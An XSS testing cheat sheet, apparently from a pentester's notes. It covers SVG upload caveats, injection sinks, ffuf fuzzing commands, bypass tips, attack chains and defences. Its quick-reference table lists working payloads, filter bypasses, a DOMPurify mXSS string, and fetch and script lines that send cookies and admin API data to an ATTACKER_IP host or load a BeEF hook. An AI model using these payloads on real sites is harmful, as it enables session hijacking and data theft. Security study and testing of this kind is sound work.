> [!warning] **When an SVG upload does *not* fire:**
> - **It's rendered via `<img src=…svg>`.** Scripts in SVG never run in image context, so it has to be opened directly (or via `<iframe>`/`<object>`/`<embed>`).
> - **It's served with `Content-Disposition: attachment`**, so it downloads instead of rendering.
> - **It's served as `text/plain`** with `X-Content-Type-Options: nosniff`.
> - **It's served from a separate sandbox domain** (`usercontent.target.com`). The XSS works, but it runs in the wrong origin; that's what `alert(document.domain)` tells you.

---

## Commonly Missed Injection Points

- `innerHTML` assignments in JS
- `document.write()` with user input
- `location.hash` / `location.search` parsed client-side
- `setTimeout()` / `setInterval()` with string arguments
- `<iframe src="javascript:...">`
- Event handlers: `onload`, `onmouseover`, `onfocus`, `onerror`, `onhashchange`
- JSONP endpoints with `callback` parameters
- `postMessage` handlers without origin checking
- Third-party widgets/analytics scripts
- HTTP headers reflected in page (User-Agent, Referer)
- File upload names displayed on page
- Error pages that reflect the URL path

---

## Automated Scanning

### Parameter Discovery

```bash
# Fuzz for reflective parameters (-mr = match the canary in the body)
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://target.com/?FUZZ=er2canary' -mr er2canary
```

### Payload Fuzzing

```bash
# Fuzz with XSS payloads — finds UNENCODED reflection, not execution; verify hits in a browser
ffuf -w /usr/share/seclists/Fuzzing/XSS/robot-friendly/XSS-BruteLogic.txt:FUZZ -u 'http://target.com/?search=FUZZ' -mr '<(img|svg|script)'

# Alternative wordlists
/usr/share/seclists/Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt
/usr/share/seclists/Fuzzing/XSS/robot-friendly/XSS-RSNAKE.txt
```

### Tools

- [[Tools/Web/Burpsuite|Burp Suite]] - Manual testing, Repeater, Scanner, DOM Invader
- [[Tools/Web/XSStrike|XSStrike]] - Context-aware fuzzer with payload evaluation
- [[Tools/Web/dalfox|DalFox]] - Fast scanner, blind XSS support
- [[Tools/Web/XSS Hunter|XSS Hunter]] - Blind XSS tracking with screenshots
- [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS) - Brute force XSS scanner (old Python 2 project, unmaintained — prefer dalfox)
- [XSSer](https://github.com/epsylon/xsser) - Automated XSS framework
- DOM Invader (PortSwigger) - DOM XSS in Burp's browser
- [[Tools/Web/BeEF|BeEF]] - Browser Exploitation Framework — hook browsers, run post-XSS modules

**Wordlists:**
- [XSS-BruteLogic.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XSS/robot-friendly/XSS-BruteLogic.txt)
- [XSS-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XSS/robot-friendly/XSS-Jhaddix.txt)
- [HackTricks - XSS](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/)
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

## Troubleshooting

### Payload Not Firing?

**Check the context:**
- View page source (not just inspect element) - is your input encoded?
- Is input inside an attribute? JS block? HTML comment? Different context = different payload
- Check if the app uses a framework. React/Vue/Angular auto-escape text, so hunt their raw-HTML escape hatches (see *Framework sinks*). The AngularJS sandbox was removed in 1.6, so `{{ }}` injection is direct code execution there.
- `<script>` inserted via `innerHTML` never runs. Switch to an event-handler payload.

**Getting filtered:**
- Try different tags (`svg`, `img`, `details`, `math`)
- Try different event handlers (`onerror`, `onload`, `onfocus`, `ontoggle`)
- Encode portions of the payload (URL, HTML entities, Unicode)
- Use capitalization tricks (`<ScRiPt>`)
- Try without quotes or parentheses (backticks, `throw`)

**CSP blocking execution:**
- Check `Content-Security-Policy` header
- Look for `unsafe-inline`, `unsafe-eval` (easy wins)
- Check for whitelisted CDNs with JSONP endpoints
- Try redirection-based exfiltration if inline is blocked

**DOM XSS not triggering:**
- Check browser console for JS errors
- Make sure your payload reaches the sink (set breakpoints)
- Some sinks need interaction (mouseover, focus, click)
- Try different sources (hash vs search vs referrer)

**Blind XSS not calling back:**
- Firewall blocking outbound connections?
- Try different ports (80, 443, 8080, 53)
- Payload might be stored but not yet viewed
- Try multiple payload formats (script tag, img onerror, fetch)

---

## Attack Chains

1. XSS → Cookie Theft → Session Hijacking → Account Takeover
2. XSS → Phishing (fake login) → Credential Theft
3. XSS → Keylogging → Credential Capture
4. Stored XSS → Admin Panel → Privilege Escalation
5. XSS → CSRF Bypass → Unauthorized Actions (password change, role change)
6. Blind XSS → Admin Session → Internal Access
7. XSS → SSRF (via fetch/XMLHttpRequest) → Internal Network Access
8. DOM XSS → Client-Side Logic Bypass → Data Exfiltration

---

## Prevention (Know the Defenses)

Understanding defenses helps you spot gaps:

| Defense | What It Does | Bypass Potential |
|---------|-------------|-----------------|
| **HTML Entity Encoding** | Converts `<>"'&` to entities | Doesn't help in JS context |
| **Input Validation** | Whitelist allowed chars | Bypass with allowed chars in payloads |
| **CSP** | Restricts script sources | Misconfigured CSPs are common |
| **HttpOnly Cookies** | Blocks JS cookie access | Can still perform actions as user |
| **X-XSS-Protection** | Legacy browser filter | Deprecated, unreliable |
| **WAF** | Pattern-based blocking | Encoding, obfuscation, polyglots |
| **Sanitization Libraries** | DOMPurify, Bleach, etc. | Solid when current — check the version and config for known mXSS bypasses (see above) |
| **Trusted Types** | Bans raw strings at DOM sinks (`innerHTML`, `eval`) | Strong when enforced with tight policies; check for a passthrough/`default` policy, Report-Only mode, and `javascript:` navigation sinks |

---

## Related Topics

**Modules:**
- [[File Upload Attacks]] - Upload HTML/SVG with XSS payloads
- [[Web Attacks]] - HTTP verb tampering, IDOR, XXE
- [[CSRF Attacks]] - XSS reads the CSRF token from the DOM, defeating every CSRF control
- [[JWT Attacks]] - Token/session theft and tampering post-XSS
- [[SQL Injection]] - Sometimes chainable with XSS

**Tools:**
- [[Tools/Web/Burpsuite|Burp Suite]] - Manual testing
- [[Tools/Scanning/ffuf|ffuf]] - Fuzzing
- [[Tools/Scanning/gobuster|gobuster]] - Enumeration

**External:**
- [HackTricks - XSS](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/)
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PortSwigger - XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP - XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)

---

## Quick Reference

| Goal | Payload / Command |
|---|---|
| Basic PoC | `<script>alert(document.domain)</script>` (`print()` inside cross-origin iframes) |
| DOM sink via innerHTML | `<img src=x onerror=alert(document.domain)>` — never `<script>` |
| Tag filtered, need event handler | `<img src=x onerror=alert(1)>` / `<svg onload=alert(1)>` |
| Check reflection | `curl -s "http://target.com/search?q=UNIQUE_STRING" \| grep UNIQUE_STRING` |
| Attribute-context breakout | `" autofocus onfocus="alert(1)` |
| JS-string-context breakout | `';alert(1);//` |
| No parens (filter bypass) | `<script>onerror=alert;throw 1</script>` / ``setTimeout`alert\x28document.domain\x29` `` |
| No space (filter bypass) | `<svg/onload=alert(1)>` / `<img/src="x"/onerror=alert(1)>` (quote the value) |
| Steal cookie (invisible) | `fetch('http://ATTACKER_IP:8001/steal?c='+encodeURIComponent(document.cookie))` |
| Bypass HttpOnly — read as user | `fetch('/api/admin/users',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://ATTACKER_IP:8001/',{method:'POST',mode:'no-cors',body:d}))` |
| Blind XSS callback | `<script src="http://ATTACKER_IP:8001/xss.js"></script>` |
| Fuzz for reflective params | `ffuf -w burp-parameter-names.txt:FUZZ -u 'http://target.com/?FUZZ=er2canary' -mr er2canary` |
| Fuzz payloads (unencoded reflection) | `ffuf -w XSS-BruteLogic.txt:FUZZ -u 'http://target.com/?search=FUZZ' -mr '<(img\|svg\|script)'` |
| Find DOM sinks in JS | `curl -s http://target.com/app.js \| grep -iE '(innerHTML\|document\.write\|eval\(\|\.html\()'` |
| CSP check | `curl -sI http://target.com \| grep -i content-security-policy` |
| Sanitizer version check | `DOMPurify.version` in console / `grep -oiE 'dompurify[^"]{0,40}' app.js` |
| mXSS (DOMPurify ≤2.0.16 only) | `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">` |
| Hook browser (BeEF) | `<script src="http://ATTACKER_IP:3000/hook.js"></script>` (HTTPS target → serve hook over TLS) |
| SVG upload XSS | `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>` |

---

*Created: 2026-02-27*
*Updated: 2026-10-08*
*Model: claude-opus-5-5*
